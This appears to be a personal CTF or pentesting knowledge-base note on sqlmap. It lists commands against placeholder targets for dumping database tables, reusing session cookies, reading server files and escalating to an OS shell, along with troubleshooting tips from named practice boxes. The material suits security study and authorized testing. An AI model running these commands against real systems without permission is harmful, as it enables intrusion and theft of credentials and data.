---
type: tool
category: framework
related: ["[[sql-injection]]"]
---

# sqlmap

Automated SQL injection detection and exploitation tool. Given a target (URL, request file, or raw request), it detects the injection point, fingerprints the DBMS, and extracts data — up to full DB dumps, file read/write, and OS shells.

## Workflow

```sh
# basic detection + DB enumeration
sqlmap -u "http://TARGET/page.php?id=1" --dbs --batch

# POST parameter, scoped to one field, one database, dump a table
sqlmap -u "http://TARGET/login" --data="user=a&pass=b" -p user -D dbname -T users --dump

# carry a session cookie (authenticated endpoints)
sqlmap -u "http://TARGET/panel.php?id=1" --cookie="PHPSESSID=..." --dbs

# read a file off the server (via LOAD_FILE)
sqlmap -u "http://TARGET/login" --data="user=a&pass=b" -p user --file-read "/path/to/file"
```

## Key flags

- `-u` URL · `-r request.txt` raw request (Burp/ZAP export) · `--data` POST body · `-p` param to test · `--cookie` session.
- `--dbs` / `-D db --tables` / `-T tbl --columns` / `--dump` — the DB → tables → columns → rows ladder.
- `--technique=B/E/U/T` restrict technique (Boolean / Error / UNION / Time). Use it once detection is done to skip slow re-probing.
- `--time-sec=N` sleep seconds for time-based (integer only; `1` is the floor).
- `--file-read` read a file, `--file-write`/`--os-shell` escalate to write/shell.
- `--batch` non-interactive (auto-answer prompts).
- `--union-cols=N` / `--union-char="zzz"` — hand sqlmap the column count and a *string* probe when a target rejects `NULL` in a reflected `text` column.
- `--code=N` — the HTTP status that means *"injection worked"* (sqlmap baselines normal responses otherwise). Set it when success looks different, e.g. `--code=403` on a login that errors with 403 ([[madeyes-castle]]).

## Notes

- **Time-based blind is the slowest technique.** Every character costs a `SLEEP` round-trip; lower `--time-sec` to speed up, and **do not** add `--threads` (it breaks the timing oracle).
- Always run manual detection first (e.g. `1=1` vs `1=2`) to *understand* the bug; let sqlmap do the grunt extraction.
- `--file-read` needs the DB user to have `FILE` privilege; if it works, `--os-shell` (write + exec) may too.
- **When sqlmap says "not injectable" but manual injection works**, it's usually one of: (a) the app reflects data in a custom JSON error that sqlmap's UNION detector can't map, (b) the reflected column is `text not null` and sqlmap's `NULL` probing fails, or (c) a resumed session mis-pins the DBMS (testing MySQL templates on a SQLite backend). Fix with `--dbms`, `--union-cols`, `--union-char`, `--no-cast` — or just do it by hand ([[madeyes-castle]]).

## Seen in

[[duque]] (time-based blind + `--file-read` on `panel.php`), [[injection]] (error-based dump of `register.users`), [[madeyes-castle]] (SQLite UNION — sqlmap failed on NULL/JSON reflection; manual `sqlite_master` + `group_concat` won)
